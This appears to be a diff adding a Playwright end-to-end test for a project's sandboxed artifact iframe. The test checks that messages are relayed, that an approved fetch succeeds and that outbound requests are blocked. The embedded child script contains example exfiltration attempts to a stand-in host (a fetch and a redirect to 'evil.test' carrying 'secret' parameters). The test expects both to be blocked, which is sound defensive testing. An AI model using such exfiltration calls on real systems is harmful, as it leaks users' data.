@@ -1,0 +1,23 @@
+import { buildArtifactBoundarySrcDoc } from '/Users/koushikk/Documents/projects/visionOS/src/lib/artifactFrameBoundary.ts';
+import { buildArtifactCsp } from '/Users/koushikk/Documents/projects/visionOS/src/lib/artifactRuntime.ts';
+import { createRequire } from 'node:module';
+const require = createRequire(import.meta.url);
+const { chromium, webkit } = require('/Users/koushikk/.cache/codex-runtimes/codex-primary-runtime/dependencies/node/node_modules/playwright');
+const shapeId = 'shape:e2e', frameToken = 'frame:e2e';
+const csp = buildArtifactCsp(['https://approved.test']);
+const childSrcDoc = `<!doctype html><html><head><meta charset="utf-8"><meta http-equiv="Content-Security-Policy" content="${csp}"></head><body><script>
+const id={shapeId:${JSON.stringify(shapeId)},frameToken:${JSON.stringify(frameToken)}};
+parent.postMessage({type:'VISIONOS_STORAGE_PENDING',...id},'*');
+parent.postMessage({type:'VISIONOS_STORAGE_SYNC',...id,storage:{counter:'1'}},'*');
+parent.postMessage({type:'VISIONOS_EXTERNAL_LINK',...id,url:'https://docs.example.test/help?from=app'},'*');
+parent.postMessage({type:'CANVASOS_IFRAME_PINCH_ZOOM',...id,deltaY:3,deltaMode:0,clientX:15,clientY:20},'*');
+parent.postMessage({type:'VISIONOS_FEATURE_BLOCKED',...id,feature:'peer-to-peer'},'*');
+fetch('https://approved.test/data').then(r=>r.text()).then(text=>parent.postMessage({type:'VISIONOS_STORAGE_SYNC',...id,storage:{fetch:text}},'*'));
+fetch('https://evil.test/private?secret=1').catch(()=>{});
+addEventListener('message',e=>{if(e.data?.type==='VISIONOS_STORAGE_FLUSH_REQUEST')parent.postMessage({type:'VISIONOS_STORAGE_FLUSH_ACK',...id,requestId:e.data.requestId,storage:{counter:'1'}},'*')});
+setTimeout(()=>location.assign('https://evil.test/leave?secret=2'),3500);
+</script></body></html>`;
+const boundarySrcDoc = buildArtifactBoundarySrcDoc({childSrcDoc,shapeId,frameToken,origins:['https://approved.test']});
+const boundaryLiteral = JSON.stringify(boundarySrcDoc).replace(/</g,'\\u003c');
+const appHtml = `<!doctype html><html><body><script>window.__events=[];addEventListener('message',e=>window.__events.push(e.data));const f=document.createElement('iframe');f.id='artifact-wrapper';f.setAttribute('sandbox','allow-scripts allow-modals');f.srcdoc=${boundaryLiteral};document.body.appendChild(f);</script></body></html>`;
+(async()=>{const out:any={};for(const [name,type] of [['chromium',chromium],['webkit',webkit]] as const){const browser=await type.launch(name==='chromium'?{headless:true,executablePath:'/Applications/Google Chrome.app/Contents/MacOS/Google Chrome'}:{headless:true});const context=await browser.newContext();const intercepted:string[]=[];const errors:string[]=[];await context.route('**/*',async(route:any)=>{const url=route.request().url();if(url.startsWith('blob:'))return route.continue();intercepted.push(url);if(url==='https://app.test/e2e')return route.fulfill({status:200,contentType:'text/html',body:appHtml});if(url==='https://approved.test/data')return route.fulfill({status:200,contentType:'text/plain',headers:{'access-control-allow-origin':'*'},body:'fixture-ok'});errors.push(url);return route.abort('blockedbyclient')});const page=await context.newPage();page.on('pageerror',(e:any)=>errors.push('page error: '+String(e)));await page.goto('https://app.test/e2e');await page.waitForTimeout(250);await page.evaluate(()=>document.getElementById('artifact-wrapper')!.contentWindow!.postMessage({type:'VISIONOS_STORAGE_FLUSH_REQUEST',shapeId:'shape:e2e',frameToken:'frame:e2e',requestId:'flush_e2e'},'*'));await page.waitForTimeout(3800);const events=await page.evaluate(()=>window.__events);out[name]={events,intercepted,errors,checks:{sync:events.some((x:any)=>x.type==='VISIONOS_STORAGE_SYNC'),ack:events.some((x:any)=>x.type==='VISIONOS_STORAGE_FLUSH_ACK'&&x.requestId==='flush_e2e'),link:events.some((x:any)=>x.type==='VISIONOS_EXTERNAL_LINK'),pinch:events.some((x:any)=>x.type==='CANVASOS_IFRAME_PINCH_ZOOM'),feature:events.some((x:any)=>x.type==='VISIONOS_FEATURE_BLOCKED'),fetch:events.some((x:any)=>x.type==='VISIONOS_STORAGE_SYNC'&&x.storage?.fetch==='fixture-ok'),nav:events.some((x:any)=>x.type==='VISIONOS_NAVIGATION_BLOCKED'),noEvil:!intercepted.some(x=>x.includes('evil.test'))}};await browser.close()}console.log(JSON.stringify(out,null,2))})().catch(e=>{console.error(e);process.exitCode=1});
